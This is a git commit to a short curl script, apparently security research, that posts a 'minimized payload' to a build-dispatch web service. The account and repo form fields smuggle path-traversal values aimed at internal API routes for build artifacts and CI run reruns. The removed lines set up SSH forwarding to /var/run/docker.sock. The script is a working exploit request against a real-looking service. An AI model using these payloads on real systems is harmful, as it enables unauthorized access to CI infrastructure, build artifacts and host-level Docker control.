11142a3be2b1f7ba51a9d1207a8ee4609cecdb2e
Daniel Eisele <daniel_eisele@gmx.de>
2024-08-19 18:54:55 +0200

    Minimize payload

--- dispatch_curl/request.sh
+++ dispatch_curl/request.sh
@@ -1,14 +1,14 @@
 curl \
   -F "account=../../api/buildjobs/v4lkob3o6d91i7jj/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
-  -F "project=libssh2-ethicalhacking" \
-  -F "buildid=1337" \
-  -F "base=main" \
+  -F "project=a" \
+  -F "buildid=0" \
+  -F "base=a" \
   -F "hash=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
   -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/runs/10239836102/rerun#" \
-  -F "ssh_host=127.0.0.1" \
-  -F "ssh_port=2222" \
-  -F "ssh_user=test" \
-  -F "ssh_forward=127.0.0.1:22 127.0.0.1:22,127.0.0.1:2375 /var/run/docker.sock" \
-  -F "ssh_hostkey=asdf" \
-  -F "ssh_privkey=asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf" \
+  -F "ssh_host=0000000" \
+  -F "ssh_port=0000" \
+  -F "ssh_user=a" \
+  -F "ssh_forward=a" \
+  -F "ssh_hostkey=a" \
+  -F "ssh_privkey=a" \
   -s 'https://dispatchoriginal.schoff.it'
